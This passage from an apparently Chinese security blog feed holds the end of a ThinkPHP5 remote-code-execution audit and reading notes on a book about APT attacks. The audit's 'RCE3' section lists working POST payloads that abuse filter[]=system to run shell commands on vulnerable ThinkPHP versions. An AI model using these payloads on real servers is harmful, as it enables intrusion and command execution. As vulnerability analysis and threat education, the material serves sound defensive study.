LogicException </span><br><span class="line">BadFunctionCallException        BadFunctionCallException </span><br><span class="line">BadMethodCallException          BadMethodCallException </span><br><span class="line">DomainException                 DomainException </span><br><span class="line">InvalidArgumentException        InvalidArgumentException </span><br><span class="line">LengthException                 LengthException </span><br><span class="line">OutOfRangeException             OutOfRangeException </span><br><span class="line">RuntimeException                RuntimeException </span><br><span class="line">OutOfBoundsException            OutOfBoundsException </span><br><span class="line">OverflowException               OverflowException </span><br><span class="line">RangeException                  RangeException </span><br><span class="line">UnderflowException              UnderflowException </span><br><span class="line">UnexpectedValueException        UnexpectedValueException </span><br><span class="line">RecursiveIteratorIterator       RecursiveIteratorIterator </span><br><span class="line">IteratorIterator                IteratorIterator </span><br><span class="line">FilterIterator                  FilterIterator </span><br><span class="line">RecursiveFilterIterator         RecursiveFilterIterator </span><br><span class="line">CallbackFilterIterator          CallbackFilterIterator </span><br><span class="line">RecursiveCallbackFilterIterator RecursiveCallbackFilterIterator </span><br><span class="line">ParentIterator                  ParentIterator </span><br><span class="line">LimitIterator                   LimitIterator </span><br><span class="line">CachingIterator                 CachingIterator </span><br><span class="line">RecursiveCachingIterator        RecursiveCachingIterator </span><br><span class="line">NoRewindIterator                NoRewindIterator </span><br><span class="line">AppendIterator                  AppendIterator </span><br><span class="line">InfiniteIterator                InfiniteIterator </span><br><span class="line">RegexIterator                   RegexIterator </span><br><span class="line">RecursiveRegexIterator          RecursiveRegexIterator </span><br><span class="line">EmptyIterator                   EmptyIterator </span><br><span class="line">RecursiveTreeIterator           RecursiveTreeIterator </span><br><span class="line">ArrayObject                     ArrayObject </span><br><span class="line">ArrayIterator                   ArrayIterator </span><br><span class="line">RecursiveArrayIterator          RecursiveArrayIterator </span><br><span class="line">SplFileInfo                     SplFileInfo </span><br><span class="line">DirectoryIterator               DirectoryIterator </span><br><span class="line">FilesystemIterator              FilesystemIterator </span><br><span class="line">RecursiveDirectoryIterator      RecursiveDirectoryIterator </span><br><span class="line">GlobIterator                    GlobIterator </span><br><span class="line">SplFileObject                   SplFileObject </span><br><span class="line">SplTempFileObject               SplTempFileObject </span><br><span class="line">SplDoublyLinkedList             SplDoublyLinkedList </span><br><span class="line">SplQueue                        SplQueue </span><br><span class="line">SplStack                        SplStack </span><br><span class="line">SplHeap                         SplHeap </span><br><span class="line">SplMinHeap                      SplMinHeap </span><br><span class="line">SplMaxHeap                      SplMaxHeap </span><br><span class="line">SplPriorityQueue                SplPriorityQueue </span><br><span class="line">SplFixedArray                   SplFixedArray </span><br><span class="line">SplObjectStorage                SplObjectStorage </span><br><span class="line">MultipleIterator                MultipleIterator </span><br><span class="line">SessionHandler                  SessionHandler </span><br><span class="line">ReflectionException             ReflectionException </span><br><span class="line">Reflection                      Reflection </span><br><span class="line">ReflectionFunctionAbstract      ReflectionFunctionAbstract </span><br><span class="line">ReflectionFunction              ReflectionFunction </span><br><span class="line">ReflectionParameter             ReflectionParameter </span><br><span class="line">ReflectionMethod                ReflectionMethod </span><br><span class="line">ReflectionClass                 ReflectionClass </span><br><span class="line">ReflectionObject                ReflectionObject </span><br><span class="line">ReflectionProperty              ReflectionProperty </span><br><span class="line">ReflectionExtension             ReflectionExtension </span><br><span class="line">ReflectionZendExtension         ReflectionZendExtension </span><br><span class="line">__PHP_Incomplete_Class          __PHP_Incomplete_Class </span><br><span class="line">php_user_filter                 php_user_filter </span><br><span class="line">Directory                       Directory </span><br><span class="line">SimpleXMLElement                SimpleXMLElement </span><br><span class="line">SimpleXMLIterator               SimpleXMLIterator </span><br><span class="line">SoapClient                      SoapClient </span><br><span class="line">SoapVar                         SoapVar </span><br><span class="line">SoapServer                      SoapServer </span><br><span class="line">SoapFault                       SoapFault </span><br><span class="line">SoapParam                       SoapParam </span><br><span class="line">SoapHeader                      SoapHeader </span><br><span class="line">PharException                   PharException </span><br><span class="line">Phar                            Phar </span><br><span class="line">PharData                        PharData </span><br><span class="line">PharFileInfo                    PharFileInfo </span><br><span class="line">XMLReader                       XMLReader </span><br><span class="line">XMLWriter                       XMLWriter </span><br><span class="line">ZipArchive                      ZipArchive </span><br><span class="line">PDOException                    PDOException </span><br><span class="line">PDO                             PDO </span><br><span class="line">PDOStatement                    PDOStatement </span><br><span class="line">PDORow                          PDORow </span><br><span class="line">CURLFile                        CURLFile </span><br><span class="line">Collator                        Collator </span><br><span class="line">NumberFormatter                 NumberFormatter </span><br><span class="line">Normalizer                      Normalizer </span><br><span class="line">Locale                          Locale </span><br><span class="line">MessageFormatter                MessageFormatter </span><br><span class="line">IntlDateFormatter               IntlDateFormatter </span><br><span class="line">ResourceBundle                  ResourceBundle </span><br><span class="line">Transliterator                  Transliterator </span><br><span class="line">IntlTimeZone                    IntlTimeZone </span><br><span class="line">IntlCalendar                    IntlCalendar </span><br><span class="line">IntlGregorianCalendar           IntlGregorianCalendar </span><br><span class="line">Spoofchecker                    Spoofchecker </span><br><span class="line">IntlException                   IntlException </span><br><span class="line">IntlIterator                    IntlIterator </span><br><span class="line">IntlBreakIterator               IntlBreakIterator </span><br><span class="line">IntlRuleBasedBreakIterator      IntlRuleBasedBreakIterator </span><br><span class="line">IntlCodePointBreakIterator      IntlCodePointBreakIterator </span><br><span class="line">IntlPartsIterator               IntlPartsIterator </span><br><span class="line">UConverter                      UConverter </span><br><span class="line">JsonIncrementalParser           JsonIncrementalParser </span><br><span class="line">mysqli_sql_exception            mysqli_sql_exception </span><br><span class="line">mysqli_driver                   mysqli_driver </span><br><span class="line">mysqli                          mysqli </span><br><span class="line">mysqli_warning                  mysqli_warning </span><br><span class="line">mysqli_result                   mysqli_result </span><br><span class="line">mysqli_stmt                     mysqli_stmt </span><br><span class="line">Composer\Autoload\ComposerStaticInit81a0c33d33d83a86fdd976e2aff753d9            Composer\Autoload\ComposerStaticInit8a67cf04fc9c0db5b85a9d897c12a44c </span><br><span class="line">think\Loader                    think\Loader</span><br><span class="line">think\Error                     think\Error </span><br><span class="line">think\Container                 think\Config </span><br><span class="line">think\App                       think\App </span><br><span class="line">think\Env                       think\Request </span><br><span class="line">think\Config                    think\Hook </span><br><span class="line">think\Hook                      think\Env </span><br><span class="line">think\Facade                    think\Lang </span><br><span class="line">think\facade\Env                think\Log </span><br><span class="line">env                             think\Route</span><br><span class="line">think\Db </span><br><span class="line">think\Lang </span><br><span class="line">think\Request </span><br><span class="line">think\facade\Route </span><br><span class="line">route </span><br><span class="line">think\Route </span><br><span class="line">think\route\Rule </span><br><span class="line">think\route\RuleGroup </span><br><span class="line">think\route\Domain </span><br><span class="line">think\route\RuleItem </span><br><span class="line">think\route\RuleName </span><br><span class="line">think\route\Dispatch </span><br><span class="line">think\route\dispatch\Url </span><br><span class="line">think\route\dispatch\Module </span><br><span class="line">think\Middleware </span><br><span class="line">think\Cookie </span><br><span class="line">think\View </span><br><span class="line">think\view\driver\Think </span><br><span class="line">think\Template </span><br><span class="line">think\template\driver\File </span><br><span class="line">think\Log </span><br><span class="line">think\log\driver\File </span><br><span class="line">think\Session </span><br><span class="line">think\Debug </span><br><span class="line">think\Cache </span><br><span class="line">think\cache\Driver </span><br><span class="line">think\cache\driver\File </span><br></pre></td></tr></table></figure><h2 id="利用总结-1"><a href="#利用总结-1" class="headerlink" title="利用总结"></a>利用总结</h2><p>by Mochazz:</p><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9/8.png" alt="8"></p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><blockquote><p>代码层面：增加对控制器名的合法性检查。</p><p>应急层面：临时开启强制路由。</p></blockquote><p>官方的修复方法是：增加正则表达式 <code>^[A-Za-z](\w)*$</code> ，对控制器名进行合法性检测。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><h1 id="RCE3"><a href="#RCE3" class="headerlink" title="RCE3"></a>RCE3</h1><h2 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># ThinkPHP &lt;&#x3D; 5.0.13</span><br><span class="line">POST &#x2F;?s&#x3D;index&#x2F;index</span><br><span class="line">s&#x3D;whoami&amp;_method&#x3D;__construct&amp;method&#x3D;&amp;filter[]&#x3D;system</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23、5.1.0 &lt;&#x3D; 5.1.16 需要开启框架app_debug</span><br><span class="line">POST &#x2F;</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;server[REQUEST_METHOD]&#x3D;ls -al</span><br><span class="line"></span><br><span class="line"># ThinkPHP &lt;&#x3D; 5.0.23 需要存在xxx的method路由，例如captcha</span><br><span class="line">POST &#x2F;?s&#x3D;xxx HTTP&#x2F;1.1</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;ls+-al</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;ls</span><br></pre></td></tr></table></figure><h2 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>和上一个RCE直接原因一样，都是没有对控制器进行很好的合法性校验。</p><p>漏洞存在于 <strong>ThinkPHP</strong> 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 <strong>远程代码执行漏洞</strong> 的产生。</p><h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.23</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h2 id="利用总结-2"><a href="#利用总结-2" class="headerlink" title="利用总结"></a>利用总结</h2><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;主要参考资料：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Mochazz/ThinkPHP-Vuln/&quot;&gt;https://github.com/Mochazz/ThinkPHP-Vuln/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;RCE1-利用缓存文件G</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="RCE" scheme="https://hack-for.fun/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>《透视APT》读书笔记</title>
    <link href="https://hack-for.fun/0.html"/>
    <id>https://hack-for.fun/0.html</id>
    <published>2020-09-20T16:00:00.000Z</published>
    <updated>2020-09-22T02:51:54.505Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png"></p><h1 id="《透视APT》"><a href="#《透视APT》" class="headerlink" title="《透视APT》"></a>《透视APT》</h1><h2 id="网络空间中的对抗"><a href="#网络空间中的对抗" class="headerlink" title="网络空间中的对抗"></a>网络空间中的对抗</h2><h3 id="APT的典型事件之——“震网病毒”"><a href="#APT的典型事件之——“震网病毒”" class="headerlink" title="APT的典型事件之——“震网病毒”"></a>APT的典型事件之——“震网病毒”</h3><ul><li>目标系统：工控系统</li><li>潜伏渗透：感染了伊朗境内60%的PC</li><li>突破物理隔离：U盘(病毒检测到宿主机插上U盘则主动向U盘感染病毒)</li><li>技术水平：同时利用多个0day(微软和西门子工控系统)，体现了APT的高级性</li><li>攻击者：极有可能是敌对关系的政治势力</li><li>攻击持续性：C2服务器2005.11就完成注册,可能长达6~7年</li></ul><h3 id="APT攻击的概念"><a href="#APT攻击的概念" class="headerlink" title="APT攻击的概念"></a>APT攻击的概念</h3><ul><li><p>起源</p><ul><li>由美国一名空军上校2006年提出</li></ul></li><li><p>何时引起关注、高潮</p><ul><li>2010伊朗震网病毒、2013美国”棱镜门”事件</li></ul></li><li><p>定义</p><ul><li><p>知名第三方机构</p><ul><li><p>维基百科、Mandiant、赛门铁克、Damballa、TechTarget</p><ul><li>1.特性：高级、持续、威胁、针对。</li></ul></li></ul></li></ul></li></ul><p>2.目标动机：政治、情报、数据、经济利益<br>3.APT目标：国防、制造业、金融、科研</p><pre><code>- 奇安信威胁情报中心    - 不是一个纯粹的技术概念，泛指有组织，有计划针对特定目标的一系列攻击    - 组织        - 国家或者政府(精神支持和物质基础)        - 情报机构、网络间谍活动的攻击组织        - 经济实体、犯罪组织、恐怖主义组织    - 能力：攻击不计成本(技术成本,比如系统0day)    - 技术特点：针对性、高度隐藏(潜伏渗透周期长)、不以经济利益为直接目的、掌握0day    - 重大安全事件不一定是APT        - 重大损失的，也不一定是APT            - 2016年美国东部互联网瘫痪</code></pre><p>2018年Facebook数据泄露<br>国内酒店大量住户信息泄露</p><pre><code>        - 影响范围大的，也不一定是APT            - 2017年WannaCry勒索病毒        - 针对性强的，也不一定是APT            - 2008年8月俄罗斯对格鲁吉亚的军事行动- APT 与威胁情报    - 威胁情报：安全机构所掌握的、针对特定组织机构的各种网络威胁信息，而该组织机构自身可能并不知道相关威胁的存在或细节        - 威胁情报的主要方面            - 源头、目标、动机、工具、指标、表象、影响、方案</code></pre><h3 id="相关研究"><a href="#相关研究" class="headerlink" title="相关研究"></a>相关研究</h3><ul><li>在全球范围内，APT研究美国和俄罗斯两国属世界一流，中国属全球第二梯队的排头兵</li><li>行业领域：军队与国防、政府、金融、外交、能源、科研、医疗、传媒、电信</li><li>目标地域：全球绝大部分的国家和地区。韩国、中东、美国、俄罗斯、巴基斯坦等国家APT最为活跃</li></ul><h2 id="APT攻击的对象"><a href="#APT攻击的对象" class="headerlink" title="APT攻击的对象"></a>APT攻击的对象</h2><h3 id="工控系统"><a href="#工控系统" class="headerlink" title="工控系统"></a>工控系统</h3><ul><li><p>乌克兰圣诞大停电事件</p><ul><li>核心攻击方式：BlackEnergy 后门程序、攻击者可远程访问并操控电力控制系统</li></ul></li><li><p>沙特阿拉伯大赦之夜攻击事件</p><ul><li><p>核心攻击方式：Shamoon(Disttrack)，能够导致目标网络完全瘫痪(通过当前的权限来访问活动目录、相同域及局域网其他主机进行横向移动)</p><ul><li>投放器(Dropper)</li><li>通信组件(Communications)</li><li>擦除组件(Wiper)</li></ul></li></ul></li><li><p>美国电网承包商攻击事件</p><ul><li>核心攻击方式：渗透网站，向网站上传恶意程序，利用恶意程序跟踪网站访问者，获得相关人员的账号密码，利用该账号发送大量钓鱼邮件</li></ul></li></ul><h3 id="金融系统"><a href="#金融系统" class="headerlink" title="金融系统"></a>金融系统</h3><ul><li><p>多国银行被盗事件</p><ul><li>核心攻击方式：<br>获得银行SWIFT权限，利用SWIFI向其他银行发送转账指令、篡改MT9XX报文清除证据</li></ul></li><li><p>ATM 机盗窃事件</p><ul><li>核心攻击方式：</li></ul></li></ul><p>1.针对性入侵金融机构员工的计算机或银行网络，进行视频监控，查看和记录负责转账系统的银行员工屏幕。获取足够的信息后，模仿银行员工的行为进行恶意操作。<br>2.插入特别制造的芯片(EMV)卡，植入恶意程序，吐钞的同时让计算机断网<br>3.入侵其他资产，通过资产内代理进行授权交易<br>4.入侵内部网络、获得ATM控制权限<br>5.通过光驱、USB接口等直接对ATM机进行操作</p><ul><li><p>黄金眼(国内APT组织)行动事件</p><ul><li>核心攻击方式：以合法软件开发公司伪装，以不当盈利作为目的，长期从事敏感金融交易信息窃取活动。（该组织攻击水平和反侦察能力均达到国际水平)</li></ul></li></ul><h3 id="地缘政治"><a href="#地缘政治" class="headerlink" title="地缘政治"></a>地缘政治</h3><ul><li><p>DNC邮件泄露、美国大选</p><ul><li>希拉里邮件门事件，利用私人电子邮件向家里私人服务器发送大量涉及国家机密的绝密邮件，大约6万封。</li><li>相关细节：希拉里竞选团队主席被钓鱼攻击上钩，泄露邮箱密码，从而获取邮箱中的邮件，同样的攻击方法在团队其他成员中也相继成功。钓鱼邮件使用了(Bitly)短链接技术来进行伪装。</li></ul></li><li><p>法国总统大选</p><ul><li>攻击组织：APT-28<br>文档:Trump’s_Attack_On_Syria_English.docx<br>核心攻击技术：<br>CVE-2017-0262(Word远程代码执行)<br>CVE-2017-0263(Windows本地权限升级)</li></ul></li></ul><h3 id="教育、科研系统"><a href="#教育、科研系统" class="headerlink" title="教育、科研系统"></a>教育、科研系统</h3><ul><li>国内顶尖大学、研究院</li><li>国内海事、电信、能源、国防、军工业</li></ul><h2 id="APT攻击的技术手段"><a href="#APT攻击的技术手段" class="headerlink" title="APT攻击的技术手段"></a>APT攻击的技术手段</h2><h3 id="APT攻击的目标"><a href="#APT攻击的目标" class="headerlink" title="APT攻击的目标"></a>APT攻击的目标</h3><ul><li><p>敏感情报信息</p><ul><li><p>PC敏感文件扩展名</p><ul><li>doc,docx,ppt,pptx,xls,xlsx,rtf,wps,et,dps,pdf,txt,dwg,rar,zip,7z,exe,eml</li></ul></li><li><p>移动端敏感文件</p><ul><li>音频、照片、通话录音、录像、通话记录、通讯录、短信、手机基本信息、地理位置信息</li></ul></li><li><p>敏感情报信息窃取方式</p><ul><li>核心思想：选择性窃取（攻击者如果活动太频繁，木马与C&amp;C服务器的通信次数越多越容易暴露）。故APT组织一般只收集特定目录下的文件或者有特殊文件名的文件。</li><li>文件直接回传、Socket通信、 电子邮件</li></ul></li></ul></li><li><p>敏感文件</p></li><li><p>经济利益</p></li><li><p>持续监控</p></li><li><p>破坏</p></li><li><p>攻击目标平台</p><ul><li><p>Windows、Android、MacOS、iOS</p></li><li><p>跨平台的水坑攻击</p><ul><li>带有恶意程序的伪造Flash升级包</li></ul></li></ul></li></ul><h3 id="APT攻击的武器搭载系统"><a href="#APT攻击的武器搭载系统" class="headerlink" title="APT攻击的武器搭载系统"></a>APT攻击的武器搭载系统</h3><ul><li><p>鱼叉攻击(Spear Phishing)</p><ul><li><p>目的：不通过授权访问机密数据</p></li><li><p>手段：最常见的方式是通过电子邮件发送给特定的攻击目标，诱使目标打开附件，这种方式就是鱼叉邮件。</p><ul><li>钓鱼邮件：这个概念和鱼叉邮件类似。不过，钓鱼多是针对普通人的攻击，针对性较弱，精确度较低。</li></ul></li><li><p>实施过程：前期准备-&gt;邮件制作-&gt;邮件投放-&gt;情报回收</p></li><li><p>防护方法：稍微有点安全意识即可，认真查看邮件来源，附件扩展名，病毒扫描，虚拟机，沙箱等。</p></li></ul></li><li><p>水坑攻击(Water Holing)</p><ul><li><p>攻击概述：攻击者通过分析攻击目标的网络活动规律，寻找攻击目标经常访问的网站的弱点，先攻下该站点并植入攻击程序，在攻击目标访问该站点时实施攻击</p></li><li><p>以海莲花APT组织的水坑攻击举例</p><ul><li><p>A方式</p><ul><li>替换目标网站的可信程序(捆绑即时通、证书驱动)</li><li>对目标网站插入恶意JavaScript程序(伪装成Adobe Flash更新程序)</li></ul></li><li><p>B方式</p><ul><li>替换目标网站站点指定链接</li></ul></li></ul></li></ul></li><li><p>PC跳板</p></li><li><p>第三方平台</p><ul><li>APT组织通过社交网络来下发C&amp;C指令，APT组织的专用木马会读取文章中的程序指令来完成指定的攻击操作</li><li>微博、Twitter、Facebook、…</li></ul></li><li><p>恶意硬件中间人劫持</p><ul><li><p>在目标网络环境中部署物理硬件设备，通过中间人方式劫持用户网络流量，替换更新包等软件</p><ul><li>输入法软件、聊天软件、下载软件、影音软件、安全软件、微软系统软件</li></ul></li><li><p>例子：火焰病毒</p></li></ul></li></ul><h3 id="APT攻击的武器装备"><a href="#APT攻击的武器装备" class="headerlink" title="APT攻击的武器装备"></a>APT攻击的武器装备</h3><ul><li><p>专用木马</p><ul><li><p>开机自启动</p><ul><li><p>修改快捷方式</p></li><li><p>DLL(动态链接库)劫持</p></li><li><p>修改注册表、服务、计划任务</p></li><li><p>APT组织为何放弃开机自启动？</p><ul><li><p>特定场景下需要一次性攻击</p><ul><li>火力侦察判断目标是否为真实目标时、目标防护能力很强时（都是为了隐藏自己的攻击</li></ul></li><li><p>依赖原始母体文件运行</p></li><li><p>用其他方法启动木马</p><ul><li>注入到其他进程、或者捆绑到其他软件</li><li>利用漏洞劫持篡改网络流量</li></ul></li></ul></li></ul></li><li><p>加密与自加密</p></li><li><p>木马升级换代</p></li></ul></li><li><p>1day \ nday</p><ul><li><p>出于攻击技术成本考虑、目标系统存在大量已知漏洞但未修复</p></li><li><p>相关例子</p><ul><li><p>CVE-2012-0158</p><ul><li>微软Office漏洞(非常稳定)，远程攻击者诱使目标打开一个经过特殊构造的RTF文件，在符合漏洞条件下，即可在目标机器上执行任意指令。</li></ul></li><li><p>CVE-2015-0097</p><ul><li>微软Office的一个逻辑漏洞，可导致目标通过HTA文件下载恶意程序到本机并执行</li></ul></li><li><p>Android 漏洞</p></li></ul></li></ul></li><li><p>0day</p><ul><li>Office 文档漏洞</li><li>Windows 提权漏洞</li><li>Flash 漏洞</li><li>其他0day</li></ul></li><li><p>APT组织武器使用成本原则(0day、或者技术成本较高的攻击手段)</p><ul><li>攻击目标具有足够的攻击价值</li><li>一般的专用木马攻击无效或者无法达到预期目的</li><li>利用1day、nday攻击依然无法达到目的或者无效</li></ul></li><li><p>APT武器研发趋势</p><ul><li><p>特别关注点：RAT(Remote Access Trojan)文件,远程访问木马的文件格式、文件形态、功能形态、恶意程序寄宿位置的变化</p></li><li><p>相关武器研发趋势</p><ul><li><p>从PE到非PE，从有实体到无实体</p></li><li><p>小众编程语言日渐流行(Delphi\GCC\NSIS\AutoIt</p></li><li><p>模块互动，云控技术渐成主流</p></li><li><p>恶意程序寄宿位置越藏越深：从常见的系统目录到难以追踪的MBR, VBR, 磁盘固件, EFI, BIOS, 移动存储设备的隐藏分区</p></li><li><p>独立研发与委托定制成主流</p><ul><li>使用公开的RAT，目的是自我隐藏和嫁祸他人</li><li>绝大部分的APT组织都是在相对独立的环境下完成攻击代码的开发工作</li><li>不排除委托第三方组成协助定制开发的可能性</li></ul></li></ul></li></ul></li></ul><h3 id="APT攻击的-C-amp-C-Command-and-Control"><a href="#APT攻击的-C-amp-C-Command-and-Control" class="headerlink" title="APT攻击的 C&amp;C(Command and Control)"></a>APT攻击的 C&amp;C(Command and Control)</h3><ul><li>主要作用：</li></ul><p>1.向感染了目标机的木马程序发送控制命令，提供下载资源(新木马，木马模块，配置文件等)<br>2.回收木马程序收集到的情报信息，包括文件、邮件等</p><ul><li><p>地域分布</p><ul><li><p>美国最多、其次中国、俄罗斯，西班牙，德国并列第三(2015年)</p><ul><li>一个APT组织可能拥有数十个，或者几个分布于不同地域的C&amp;C服务器</li></ul></li></ul></li><li><p>注册机构</p><ul><li><p>国内外APT组织均使用或部分使用境外服务商动态域名，ChangIP,DynDNS,No-IP,Afraid(FreeDNS),dnsExit</p><ul><li>动态域名的好处：</li></ul></li></ul></li></ul><p>1.相关注册信息不对外公开(无whois信息)<br>2.需要域名持有者的权限才能查询相关信息</p><ul><li><p>注册偏好</p><ul><li><p>模仿邮箱类</p><ul><li>126mailserver 、mail163等</li></ul></li><li><p>模仿杀毒软件类</p><ul><li>safe360、rising等</li></ul></li><li><p>模仿互联网公司类</p><ul><li>360sc2、sohu、sogou、sina等</li></ul></li></ul></li></ul><h2 id="APT攻击的战术布阵"><a href="#APT攻击的战术布阵" class="headerlink" title="APT攻击的战术布阵"></a>APT攻击的战术布阵</h2><h3 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h3><ul><li><p>重要性：APT组织发动一次攻击，绝大部分时间都会消耗在情报收集环节上。为了达到攻击目的，攻击者必须尽可能地全面的收集攻击目标相关的情报信息，从认知水平到掌握水平。</p></li><li><p>公开情报收集</p><ul><li>官方网站、行业网站、学术期刊、行业会议、新闻报道等</li></ul></li><li><p>地下情报收集</p><ul><li>地下黑市购买社工库</li><li>入侵第三方网站以获取目标人员、组织的情报信息</li><li>向其他APT组织购买情报信息</li></ul></li></ul><h3 id="火力侦察"><a href="#火力侦察" class="headerlink" title="火力侦察"></a>火力侦察</h3><ul><li>目的：收集攻击目标网络或设备的基本信息、判断攻击目标的真伪(是否为虚拟机)、防御能力、攻击价值。以及方便后期横向移动的准确性。</li><li>主机信息：操作系统信息、主机名称、本地用户名等</li><li>网络信息：主要是IP地址、网关信息</li><li>应用程序信息及相关版本信息，微软Office、微软Internet Explorer</li><li>磁盘信息、当前进程信息等</li></ul><h3 id="供应链攻击"><a href="#供应链攻击" class="headerlink" title="供应链攻击"></a>供应链攻击</h3><ul><li><p>攻击原理</p><ul><li>当攻击目标本身的防御措施特别完善时，或初始攻击无法达到效果，对目标相关的周边企业、人员、供应链进行攻击，有可能取得较好的效果。</li></ul></li><li><p>典型案例</p><ul><li>震网病毒、Havex</li></ul></li></ul><h3 id="假旗行动"><a href="#假旗行动" class="headerlink" title="假旗行动"></a>假旗行动</h3><ul><li><p>概述</p><ul><li><p>也叫伪旗行动，是隐蔽行动的一种。通过使用其他组织的旗帜、制服等手段误导公众、使公众认为该攻击是其他攻击组织执行。</p><ul><li>相关战术术语：拟态、诱饵、混淆、伪装、干扰</li></ul></li></ul></li><li><p>类型</p><ul><li><p>预设陷阱</p><ul><li>样本文件、C&amp;C服务器域名、特殊字符串、上线密码、诱饵文档属性信息等</li></ul></li><li><p>事后掩盖</p><ul><li>攻击成功后，对域名whois、IP地址等信息进行伪装</li></ul></li></ul></li><li><p>冒充对象</p><ul><li>冒充其他APT组织</li><li>冒充普通用户</li></ul></li><li><p>国家级情报机构对该行动的观点</p><ul><li><p>五眼联盟</p><ul><li>与欺骗相关的策略：暗区(DarkSpace)、蜜罐(Honeypot)、蜜令(Honeytoken)、蜜网(Honeynet)、假旗行动(False Flag)、效果(Effects)</li></ul></li><li><p>五眼联盟对假旗行动的观点：1.有意制造攻击目标与被嫁祸国或组织间紧张的敌对气氛，以实现某种政治或经济目的 2.更好地隐藏自己，避免暴露，收获更大利益。</p></li></ul></li></ul><h3 id="周期性袭扰"><a href="#周期性袭扰" class="headerlink" title="周期性袭扰"></a>周期性袭扰</h3><ul><li>周一、二（工作日处理邮件、文件高峰期）</li><li>大型节日（如国庆节、春节等）</li></ul><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><ul><li>目的：</li></ul><p>1.进一步在感染的目标机器上获取更多有价值的信息<br>2. 借助受感染的机器，探测周边其他设备的情况或直接向周边设备发动攻击</p><ul><li><p>横向移动攻击步骤</p><ul><li>侦察和识别网络拓扑、获取域计算机信息、当前计算机相关主机信息、网卡信息、路由信息等</li><li>查看远程计算机服务及状态、获取指定IP共享信息、共享目录、扫描内网机器远程端口等</li><li>补充原有木马没有的功能、窃取本机更多信息、向周边其他设备发动攻击</li><li>常用命令：net view、ipconfig /all、netstat -a/n、nbstat -A、systeminfo、tracert -w 1000 8.8.8.8、ping、telnet、利用PowerShell远程加载木马或者上传情报信息到C&amp;C服务器</li></ul></li></ul><h3 id="伪装术"><a href="#伪装术" class="headerlink" title="伪装术"></a>伪装术</h3><ul><li><p>社会工程学伪装</p><ul><li>邮件内容伪装</li><li>邮件身份伪装</li></ul></li><li><p>文件视觉伪装</p><ul><li>文件名</li><li>文件扩展名</li><li>文件图标</li></ul></li><li><p>快捷方式伪装</p><ul><li>将攻击代码文件和一个指向攻击代码的快捷方式文件打包成一个压缩包，同时，快捷方式的命名具有迷惑性</li></ul></li><li><p>捆绑合法程序</p><ul><li><p>AWVS7</p><ul><li>针对网络安全行业</li></ul></li><li><p>办公软件</p><ul><li>政府单位、事业单位</li></ul></li><li><p>即时通、证书驱动</p><ul><li>政府机构</li></ul></li><li><p>微软更新程序</p></li><li><p>Microsoft Visio Professional 2013</p></li></ul></li><li><p>压缩包外壳</p><ul><li>将木马程序进行压缩，以压缩包的形式传播</li></ul></li></ul><h3 id="反侦察术"><a href="#反侦察术" class="headerlink" title="反侦察术"></a>反侦察术</h3><ul><li>一些APT组织的攻击木马会判断自身所处的环境、发现杀软时、会选择放弃执行后续的功能代码、或者设法绕过杀软的监测。</li><li>一些APT组织会对安全研究人员进行反向侦察工作，比如海莲花组织向AWVS的破解版中插入了木马。</li></ul><h2 id="APT攻击的监测与防御"><a href="#APT攻击的监测与防御" class="headerlink" title="APT攻击的监测与防御"></a>APT攻击的监测与防御</h2><h3 id="如何发现APT攻击"><a href="#如何发现APT攻击" class="headerlink" title="如何发现APT攻击"></a>如何发现APT攻击</h3><ul><li><p>大数据技术</p><ul><li>数据采集、数据分析、数据呈现</li></ul></li><li><p>威胁情报技术</p><ul><li><p>“标志”(Indicator of Compromise,IOC),也叫入侵指示器：通常包括主机活动中出现的文件、进程、注册表键值、系统服务、网络上的域名、URL、IP等</p></li><li><p>分类</p><ul><li><p>战术情报</p><ul><li>标记攻击者使用工具相关的特纸值及网络基础设施信息、可直接用于设备、实现对攻击活动的监控，IOC即是一个典型</li></ul></li><li><p>作战情报</p><ul><li>描述攻击者的工具、技术和过程，即TTP</li></ul></li><li><p>战略情报</p><ul><li>描述当前对于特定组织的威胁类型和对手现状、指导安全投资的大方向。使用者为CSO(Chief Security Officer), CISO(Chief 